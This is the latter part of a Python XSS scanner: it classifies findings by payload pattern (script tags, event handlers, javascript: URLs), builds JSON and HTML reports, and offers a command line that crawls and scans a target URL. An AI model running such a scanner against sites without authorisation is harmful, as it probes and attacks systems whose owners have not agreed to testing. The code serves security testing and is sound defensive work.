        grouped = defaultdict(list)

        for vuln in vulns:
            # Group by URL + parameter + payload type
            payload_type = self._classify_payload_type(vuln.payload)
            group_key = f"{vuln.url}:{vuln.parameter}:{payload_type}"
            grouped[group_key].append(vuln)

        result = []
        for group_key, vuln_list in grouped.items():
            # Sort by confidence and severity
            vuln_list.sort(key=lambda x: (
                -x.confidence,  # Higher confidence first
                -self._severity_value(x.severity)  # Higher severity first
            ))
            result.append(vuln_list[0])

        return result

    def _classify_payload_type(self, payload: str) -> str:
        """Classify payload by type"""
        payload_lower = payload.lower()

        if '<script>' in payload_lower:
            return 'script_tag'
        elif 'onerror=' in payload_lower or 'onload=' in payload_lower:
            return 'event_handler'
        elif 'javascript:' in payload_lower:
            return 'javascript_url'
        elif 'data:' in payload_lower:
            return 'data_url'
        elif '<svg' in payload_lower:
            return 'svg_tag'
        elif '<img' in payload_lower:
            return 'img_tag'
        elif '<iframe' in payload_lower:
            return 'iframe_tag'
        elif 'innerhtml' in payload_lower or 'document.write' in payload_lower:
            return 'dom_manipulation'
        elif 'eval(' in payload_lower or 'function(' in payload_lower:
            return 'js_execution'
        else:
            return 'other'

    def _severity_value(self, severity: str) -> int:
        """Convert severity to numeric value"""
        severity_map = {
            'critical': 4,
            'high': 3,
            'medium': 2,
            'low': 1,
            'info': 0
        }
        return severity_map.get(severity.lower(), 0)

    def _keep_best_per_vector(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Keep best finding per attack vector"""
        # Group by attack vector
        vectors = defaultdict(list)

        for vuln in vulns:
            vector = self._determine_attack_vector(vuln)
            vectors[vector].append(vuln)

        result = []
        for vector, vuln_list in vectors.items():
            # Get the most severe
            vuln_list.sort(key=lambda x: (
                -self._severity_value(x.severity),
                -x.confidence
            ))
            result.append(vuln_list[0])

        return result

    def _determine_attack_vector(self, vuln: Vulnerability) -> str:
        """Determine the attack vector"""
        if vuln.type == 'dom':
            return f"dom_{vuln.parameter}"
        elif vuln.type == 'stored':
            return f"stored_{vuln.parameter}"
        else:  # reflected
            return f"reflected_{vuln.parameter}"

    def calculate_statistics(self):
        """Calculate scan statistics"""
        stats = {
            'total_pages': len(self.results.pages),
            'total_forms': sum(len(page.forms) for page in self.results.pages),
            'total_inputs': sum(len(page.inputs) for page in self.results.pages),
            'vulnerabilities_by_type': defaultdict(int),
            'vulnerabilities_by_severity': defaultdict(int),
            'vulnerabilities_by_confidence': {
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }

        for vuln in self.results.vulnerabilities:
            stats['vulnerabilities_by_type'][vuln.type] += 1
            stats['vulnerabilities_by_severity'][vuln.severity] += 1

            if vuln.confidence >= 0.8:
                stats['vulnerabilities_by_confidence']['high'] += 1
            elif vuln.confidence >= 0.5:
                stats['vulnerabilities_by_confidence']['medium'] += 1
            else:
                stats['vulnerabilities_by_confidence']['low'] += 1

        self.results.statistics = stats


# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate detailed reports"""

    @staticmethod
    def generate_json_report(scan_result: ScanResult, output_file: str):
        """Generate JSON report"""
        report_data = {
            'metadata': {
                'scan_id': scan_result.scan_id,
                'target': scan_result.target_url,
                'start_time': scan_result.start_time,
                'end_time': scan_result.end_time,
                'duration': scan_result.duration,
                'scanner_version': '1.0.0'
            },
            'summary': {
                'pages_scanned': scan_result.pages_scanned,
                'vulnerabilities_found': scan_result.vulnerabilities_found,
                'possible_vulnerabilities_found':scan_result.possible_vulnerabilities_found,
                'waf_detected': scan_result.waf_detected,
                'waf_type': scan_result.waf_type,
                'technologies': scan_result.tech_stack
            },
            'statistics': scan_result.statistics,
            'vulnerabilities': [vuln.to_dict() for vuln in scan_result.vulnerabilities],
            'possible_vulnerabilities':[vuln.to_dict() for vuln in scan_result.possible_vulnerabilities],
            'pages': [asdict(page) for page in scan_result.pages[:10]],  # First 10 pages
            'config': scan_result.config
        }

        with open(output_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)

        print(f"JSON report saved to: {output_file}")
        return output_file

    @staticmethod
    def generate_html_report(scan_result: ScanResult, output_file: str):
        """Generate HTML report"""
        template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Scan Report - {scan_id}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; margin: -30px -30px 30px -30px; }}
                h1 {{ margin: 0; font-size: 28px; }}
                .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }}
                .summary-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #667eea; }}
                .summary-card.critical {{ border-color: #dc3545; }}
                .summary-card.high {{ border-color: #fd7e14; }}
                .summary-card.medium {{ border-color: #ffc107; }}
                .summary-card.low {{ border-color: #28a745; }}
                .vuln-card {{ border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 8px; }}
                .vuln-card.critical {{ background: #f8d7da; border-color: #f5c6cb; }}
                .vuln-card.high {{ background: #fff3cd; border-color: #ffeaa7; }}
                .vuln-card.medium {{ background: #d1ecf1; border-color: #bee5eb; }}
                .vuln-card.low {{ background: #d4edda; border-color: #c3e6cb; }}
                .badge {{ display: inline-block; padding: 5px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }}
                .badge.critical {{ background: #dc3545; color: white; }}
                .badge.high {{ background: #fd7e14; color: white; }}
                .badge.medium {{ background: #ffc107; color: black; }}
                .badge.low {{ background: #28a745; color: white; }}
                pre {{ background: #2b2b2b; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }}
                code {{ font-family: 'Courier New', monospace; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #f8f9fa; font-weight: bold; }}
                .tech-tag {{ display: inline-block; background: #e9ecef; padding: 5px 10px; margin: 2px; border-radius: 3px; font-size: 12px; }}
                .vuln-title {{display: flex;flex-wrap: wrap;gap: 0.5rem;align-items: center;}}
                .vuln-url {{max-width: 100%;word-break: break-all;overflow-wrap: anywhere;white-space: normal;display: inline-block;}}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🚨 XSS Vulnerability Scan Report</h1>
                    <p>Scan ID: {scan_id} | Target: {target_url}</p>
                    <p>Scan Duration: {duration:.2f} seconds | {vuln_count} vulnerabilities found</p>
                </div>

                <h2>📊 Summary</h2>
                <div class="summary-grid">
                    <div class="summary-card">
                        <h3>Pages Scanned</h3>
                        <p style="font-size: 24px; font-weight: bold;">{pages_scanned}</p>
                    </div>
                    <div class="summary-card">
                        <h3>Total Vulnerabilities</h3>
                        <p style="font-size: 24px; font-weight: bold;">{vuln_count}</p>
                    </div>
                    <div class="summary-card critical">
                        <h3>Critical</h3>
                        <p style="font-size: 24px; font-weight: bold;">{critical_count}</p>
                    </div>
                    <div class="summary-card high">
                        <h3>High</h3>
                        <p style="font-size: 24px; font-weight: bold;">{high_count}</p>
                    </div>
                    <div class="summary-card medium">
                        <h3>Medium</h3>
                        <p style="font-size: 24px; font-weight: bold;">{medium_count}</p>
                    </div>
                    <div class="summary-card low">
                        <h3>Low</h3>
                        <p style="font-size: 24px; font-weight: bold;">{low_count}</p>
                    </div>
                </div>

                <h2>🔧 Technologies Detected</h2>
                <div>
                    {tech_tags}
                </div>

                <h2>🛡️ WAF Detection</h2>
                <p>{waf_status}</p>
                
                <span class="highlight" style="background: #fff3cd;color: #664d03;padding: 2px 6px;border-radius: 4px;font-weight: 600;"><strong><em>* Ignore all Informative Vulnerabilities *</em></strong></span>

                <div class="filter-bar">
                        <label for="vulnFilter">Show:</label>
                    <select id="vulnFilter" onchange="filterVulns()">
                    <option value="detected">Detected</option>
                    <option value="possible">Possibility</option>
                    </select>
                </div>

                <div id="detected-vulns" class="vuln-section">
                    {vulnerabilities_html_detected}
                </div>

                <div id="possible-vulns" class="vuln-section" style="display:none;">
                {vulnerabilities_html_possible}
                </div>

                <h2>📈 Statistics</h2>
                <table>
                    <tr>
                        <th>Vulnerability Type</th>
                        <th>Count</th>
                    </tr>
                    {stats_rows}
                </table>

                <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666;">
                    <p>Report generated by Advanced XSS Scanner v1.0.0</p>
                    <p>Scan completed: {end_time}</p>
                </div>
            </div>
            
            <script>
                function filterVulns() {{
                const value = document.getElementById("vulnFilter").value;

                    document.getElementById("detected-vulns").style.display =
                        value === "detected" ? "block" : "none";

                document.getElementById("possible-vulns").style.display =
                    value === "possible" ? "block" : "none";
                    }}
            </script>
        </body>
        </html>
        """

        # Calculate counts
        critical_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'critical')
        high_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'high')
        medium_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'medium')
        low_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'low')
        # Technology tags
        tech_tags = ""
        for tech in scan_result.tech_stack:
            tech_tags += f'<span class="tech-tag">{tech}</span>\n'

        # WAF status
        waf_status = f"✅ No WAF detected" if not scan_result.waf_detected else f"⚠️ WAF detected: {scan_result.waf_type}"

        # Vulnerabilities HTML
        vulnerabilities_html_detected = ""
        for vuln in scan_result.vulnerabilities:
            vuln_class = vuln.severity.lower()
            vulnerabilities_html_detected += f"""
            <div class="vuln-card {vuln_class}">
                <h3>
                    <span class="badge {vuln_class}">{vuln.severity.upper()}</span>
                    {html.escape(vuln.type.title())} XSS - <span class="vuln-url">{html.escape(vuln.url)}</span>
                </h3>
                <p><strong>Parameter:</strong> {html.escape(vuln.parameter or 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{html.escape(vuln.payload or 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {html.escape(vuln.evidence or 'N/A')}</p>
                <p><strong>Confidence:</strong> {vuln.confidence * 100:.1f}%</p>
                <details>
                    <summary>Show Details</summary>
                    <pre>URL: {html.escape(vuln.url)}
Method: {vuln.method}
Location: {vuln.location or 'N/A'}
CWE: {', '.join(vuln.cwe)}</pre>
                </details>
            </div>
            """

        vulnerabilities_html_possible = ""
        for vuln in scan_result.possible_vulnerabilities:
            vuln_class = vuln.severity.lower()
            vulnerabilities_html_possible += f"""
                    <div class="vuln-card {vuln_class}">
                        <h3>
                            <span class="badge {vuln_class}">{vuln.severity.upper()}</span>
                            {html.escape(vuln.type.title())} XSS - <span class="vuln-url">{html.escape(vuln.url)}</span>
                        </h3>
                        <p><strong>Parameter:</strong> {html.escape(vuln.parameter or 'N/A')}</p>
                        <p><strong>Payload:</strong> <code>{html.escape(vuln.payload or 'N/A')}</code></p>
                        <p><strong>Evidence:</strong> {html.escape(vuln.evidence or 'N/A')}</p>
                        <p><strong>Confidence:</strong> {vuln.confidence * 100:.1f}%</p>
                        <details>
                            <summary>Show Details</summary>
                            <pre>URL: {html.escape(vuln.url)}
        Method: {vuln.method}
        Location: {vuln.location or 'N/A'}
        CWE: {', '.join(vuln.cwe)}</pre>
                        </details>
                    </div>
                    """


        # Statistics rows
        stats_rows = ""
        for vuln_type, count in scan_result.statistics.get('vulnerabilities_by_type', {}).items():
            stats_rows += f"<tr><td>{vuln_type}</td><td>{count}</td></tr>\n"

        # Fill template
        html_content = template.format(
            scan_id=scan_result.scan_id,
            target_url=scan_result.target_url,
            duration=scan_result.duration,
            vuln_count=scan_result.vulnerabilities_found,
            pages_scanned=scan_result.pages_scanned,
            critical_count=critical_count,
            high_count=high_count,
            medium_count=medium_count,
            low_count=low_count,
            tech_tags=tech_tags,
            waf_status=waf_status,
            vulnerabilities_html_detected=vulnerabilities_html_detected,
            vulnerabilities_html_possible = vulnerabilities_html_possible,
            stats_rows=stats_rows,
            end_time=scan_result.end_time
        )

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"HTML report saved to: {output_file}")
        return output_file


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Advanced XSS Scanner - Complete URL-based XSS detection tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://example.com --output report.json
  %(prog)s https://example.com --depth 5 --concurrent 20
  %(prog)s https://example.com --no-selenium --quick
        """
    )

    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--output", "-o", help="Output file for report")
    parser.add_argument("--format", "-f", choices=["json", "html", "both"],
                        default="json", help="Output format")
    parser.add_argument("--depth", "-d", type=int, default=3, help="Crawl depth")
    parser.add_argument("--pages", "-p", type=int, default=50, help="Maximum pages to scan")
    parser.add_argument("--concurrent", "-c", type=int, default=10, help="Concurrent requests")
    parser.add_argument("--timeout", "-t", type=int, default=30, help="Request timeout")
    parser.add_argument("--payloads", type=int, default=50, help="Payloads per test")
    parser.add_argument("--quick", action="store_true", help="Quick scan mode")
    parser.add_argument("--full", action="store_true", help="Full scan mode")
    parser.add_argument("--no-selenium", action="store_true", help="Disable Selenium for DOM XSS")
    parser.add_argument("--proxy", help="Use proxy (http://proxy:port)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--debug", action="store_true", help="Debug mode")

    args = parser.parse_args()

    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("Error: URL must start with http:// or https://")
        sys.exit(1)

    # Configure scanner
    config = ScannerConfig()
    config.max_depth = args.depth
    config.max_pages = args.pages
    config.max_concurrent = args.concurrent
    config.timeout = args.timeout
    config.payload_count = args.payloads
    config.use_selenium = not args.no_selenium
    config.use_proxy = args.proxy
    config.verbose = args.verbose
    config.debug = args.debug

    if args.depth == 0:
        # When depth is 0, only scan the provided URL
        config.max_pages = 1  # Only scan the initial page

    # Adjust for quick/full mode
    if args.quick:
        config.max_pages = 10
        config.payload_count = 20
        config.scan_types = ['reflected', 'dom']

    if args.full:
        config.max_pages = 100
        config.payload_count = 100
        config.scan_types = ['reflected', 'stored', 'dom', 'blind']



    try:
        # Create and run scanner
        scanner = AdvancedXSSScanner(config)
        results = scanner.scan(args.url)

        # Generate reports
        if args.format in ["json", "both"]:
            if args.output:
                # User provided output name
                if '.' in args.output:
                    # Has extension
                    if args.output.endswith('.json'):
                        json_output = args.output
                    elif args.output.endswith('.html'):
                        json_output = args.output.replace('.html', '.json')
                    else:
                        # Some other extension, replace with .json
                        json_output = os.path.splitext(args.output)[0] + '.json'
                else:
                    # No extension provided
                    if args.format == "both":
                        json_output = args.output + ".json"
                    else:
                        json_output = args.output if args.output.endswith('.json') else args.output + '.json'
            else:
                # Auto-generate
                json_output = f"xss_report_{results.scan_id}.json"

            ReportGenerator.generate_json_report(results, json_output)

        if args.format in ["html", "both"]:
            if args.output:
                # User provided output name
                if '.' in args.output:
                    # Has extension
                    if args.output.endswith('.html'):
                        html_output = args.output
                    elif args.output.endswith('.json'):
                        html_output = args.output.replace('.json', '.html')
                    else:
                        # Some other extension, replace with .html
                        html_output = os.path.splitext(args.output)[0] + '.html'
                else:
                    # No extension provided
                    if args.format == "both":
                        html_output = args.output + ".html"
                    else:
                        html_output = args.output if args.output.endswith('.html') else args.output + '.html'
            else:
                # Auto-generate
                html_output = f"xss_report_{results.scan_id}.html"

            ReportGenerator.generate_html_report(results, html_output)


        # Print summary
        print("\n" + "=" * 80)
        print("SCAN COMPLETED".center(80))
        print("=" * 80)
        print(f"Target: {results.target_url}")
        print(f"Pages scanned: {results.pages_scanned}")
        print(f"Vulnerabilities found (unique): {results.vulnerabilities_found}")
        print(f"Scan ID: {results.scan_id}")
        print(f"Duration: {results.duration:.2f} seconds")
        print("=" * 80)

        # Exit with appropriate code
        if results.vulnerabilities_found > 0:
            print("⚠️  Vulnerabilities detected!")
            sys.exit(1)
        else:
            print("✅ No vulnerabilities found!")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n\nScan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)






# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    main()



#=================================
#  Usage
# python xss_scanner.py http://127.0.0.1/xs.php \
#   --full \
#   --format both \
#   --depth 4 \
#   --pages 100 \
#   --concurrent 8 \
#   --payloads 50 \
#   --output xs_vulnerability_report \
#   --verbose
#========================




# --depth 0 (only for defined URL )